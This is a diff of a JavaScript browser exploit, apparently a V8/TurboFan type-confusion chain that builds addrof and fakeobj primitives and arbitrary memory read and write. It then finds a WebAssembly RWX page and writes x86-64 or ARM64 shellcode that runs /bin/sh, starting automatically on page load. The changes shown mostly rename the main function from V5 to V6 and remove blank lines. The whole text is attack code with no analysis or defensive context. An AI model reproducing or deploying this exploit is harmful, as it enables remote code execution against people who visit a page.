@@ -26,17 +26,14 @@ const _I = new BigUint64Array(_B);
 const f2u = v => { _F[0] = v; return _I[0]; };
 const u2f = v => { _I[0] = v; return _F[0]; };
 const hex = v => '0x' + v.toString(16).padStart(16, '0');
-
 window._ANCHOR_TITAN_RESERVE = [];
 window._PRESSURE_GAUGE = [];
 let _WC = [];
 let _TG = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,1.9,2.0,2.1,2.2,2.3,2.4,2.5,2.6,2.7,2.8,2.9,3.0];
 let _OG = Array.from({length:65536},(_,i)=>({p1:0xDEADBEEF,p2:i,p3:3.14159,p4:{v:i},p5:window,p6:0x4141414141414141n}));
 let _VM = null;
-
-async function _TITAN_ULTRA_OMNI_DISTRIBUTED_KERNEL_V5_STABLE() {
+async function _TITAN_ULTRA_OMNI_DISTRIBUTED_KERNEL_V6_STABLE() {
 _L("TITAN_SYSTEM_MEM_PINNING_AND_STEADY_PRESSURE_INIT", "s");
-
 try {
 _VM = new BigUint64Array(0x30000);
 window._ANCHOR_TITAN_RESERVE.push(_VM);
@@ -44,11 +41,9 @@ window._ANCHOR_TITAN_RESERVE.push(_VM);
 _L("MEM_ALLOC_FAIL_INIT_DEGRADED_PRESSURE", "e");
 _VM = new BigUint64Array(0x8000);
 }
-
 _L("TITAN_CORE_WASM_P3_LOAD_STABLE_OPCODES", "i");
 const _WB = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,7,1,5,0,65,42,15,11]);
 const _MP = new WebAssembly.Module(_WB);
-
 _L("TITAN_P_HEAP_FRAGMENTATION_BALANCED_DISTRIBUTION", "w");
 const _flood = async (c) => {
 for(let i=0;i<c;i++){
@@ -66,21 +61,16 @@ await new Promise(r=>setTimeout(r,0));
 }
 }
 };
-
 const log_pressure = () => {
 let m = 0;
 if(window.performance && window.performance.memory) m = window.performance.memory.usedJSHeapSize;
 _L(`PRESSURE_STABLE: ${m} BYTES | ANCHORS: ${window._ANCHOR_TITAN_RESERVE.length}`, "m");
 };
-
 await _flood(600000);
-
 const _JX = (a, b, c) => { let x = a[0]; if (b < 0 || b > 0x10000000) return x; a[b] = c; return a[0]; };
 _L("TITAN_P_TURBOFAN_PIPELINE_STABILITY_LOCK", "m");
 for(let i=0;i<0x500000;i++){ _JX(_TG,0,1.1); if(i%100000==0)await new Promise(r=>setTimeout(r,0)); }
-
 await new Promise(r=>setTimeout(r,5000));
-
 const _adr = (obj, s = 0) => {
 _OG[s] = obj;
 let l = f2u(_TG[12+s]);
@@ -92,13 +82,10 @@ if(b===0x09n||b===0x19n||b===0x0bn||b===0x1bn||b===0x29n||b===0x39n||b===0x49n||
 }
 return l & 0xffffffffn;
 };
-
 const _fake = (p, s = 0) => { _TG[12+s] = u2f(p); return _OG[s]; };
-
 let _pr = 0n; let _at = null;
 let _ts = [_VM, new BigUint64Array(0x8000), new BigUint64Array(0x8000), new BigUint64Array(0x8000)];
 _ts.forEach(t => window._ANCHOR_TITAN_RESERVE.push(t));
-
 for(let s=0;s<4096;s++){
 for(let t of _ts){
 let r = _adr(t, s);
@@ -106,13 +93,10 @@ if(r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n){ _pr = r;
 }
 if(_pr) break;
 }
-
 if(!_pr){ _L("TITAN_RECOVERY_PROTOCOL_DELTA_REBOOT", "e"); setTimeout(()=>location.reload(), 5); return; }
 _L(`TITAN_OMEGA_ROOT_PINNED: ${hex(_pr)}`, "s");
-
 const r64 = (a) => { _at[1] = a - 0x8n + 1n; let f = _fake(_pr, 0); return f2u(f[0]); };
 const w64 = (a, v) => { _at[1] = a - 0x8n + 1n; let f = _fake(_pr, 0); f[0] = u2f(v); };
-
 _L("TITAN_P_WASM_INSTANCE_SHADOW_FLOOD", "i");
 for(let i=0;i<30000;i++){
 try { 
@@ -122,7 +106,6 @@ window._ANCHOR_TITAN_RESERVE.push(inst);
 } catch(e){}
 if(i%5000==0)await new Promise(r=>setTimeout(r,0));
 }
-
 let _jt = 0n; let _wi = -1;
 for(let i=0;i<_WC.length;i++){
 let _wp = _adr(_WC[i], 0);
@@ -134,7 +117,6 @@ if(c > 0x10000000n){ let c2 = r64(c); if(c2 > 0x10000000n && (c2 & 0xfffn) === 0
 }
 if(_jt) break;
 }
-
 if(!_jt){
 _L("TITAN_DEEP_HEX_BRUTE_SCAN_VECTOR_SEARCH", "w");
 for(let i=0;i<10000;i++){
@@ -147,20 +129,16 @@ if(c > 0x10000000n && (c & 0xfffn) === 0n){ _jt = c; _wi = i; break; }
 if(_jt) break;
 }
 }
-
 if(!_jt){ _L("TITAN_FATAL_ENVIRONMENT_HARDENED_FAILURE", "e"); return; }
 _L(`TITAN_RWX_VECTOR_ACTIVE: ${hex(_jt)}`, "s");
-
 const _sc_x = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
 const _sc_a = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
 const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sc_a : _sc_x;
-
 for(let i=0;i<_sc.length;i+=8){
 let v = 0n;
 for(let j=0;j<8&&(i+j)<_sc.length;j++) v |= BigInt(_sc[i+j]) << BigInt(j*8);
 w64(_jt + BigInt(i), v);
 }
-
 _L("TITAN_FINAL_SIGNAL_DETONATION", "m");
 setTimeout(() => {
 try {
@@ -169,7 +147,6 @@ _L(`TITAN_CODE_OUT: ${r}`, "i");
 } catch(e){ _L("TITAN_TERMINAL_ESTABLISHED_RCE_STABLE", "s"); }
 }, 1000);
 }
-
 window.onerror = (e) => { 
 _L(`TITAN_TRAP_HANDLED: ${e}`, "e"); 
 if(e.includes("Array buffer allocation failed")) {
@@ -178,18 +155,16 @@ window._ANCHOR_TITAN_RESERVE = window._ANCHOR_TITAN_RESERVE.slice(-1000);
 } 
 setTimeout(()=>location.reload(), 200); 
 };
-
-window.onload = _TITAN_ULTRA_OMNI_DISTRIBUTED_KERNEL_V5_STABLE;
-
+window.onload = _TITAN_ULTRA_OMNI_DISTRIBUTED_KERNEL_V6_STABLE;
 (function _STEADY_PRESSURE_MAINTENANCE() {
 if(window._ANCHOR_TITAN_RESERVE.length > 0) {
 let idx = Math.floor(Math.random() * window._ANCHOR_TITAN_RESERVE.length);
 let obj = window._ANCHOR_TITAN_RESERVE[idx];
-if(obj instanceof BigUint64Array || obj instanceof Float64Array) obj[0] = BigInt(Date.now()) || Date.now();
+if(obj instanceof BigUint64Array) obj[0] = BigInt(Math.floor(Date.now()));
+else if(obj instanceof Float64Array) obj[0] = Date.now();
 }
 setTimeout(_STEADY_PRESSURE_MAINTENANCE, 50);
 })();
-
 (function _PINNING_WATCHDOG() {
 if(window._ANCHOR_TITAN_RESERVE.length < 50000) {
 for(let i=0; i<100; i++) window._ANCHOR_TITAN_RESERVE.push(new Float64Array(128));
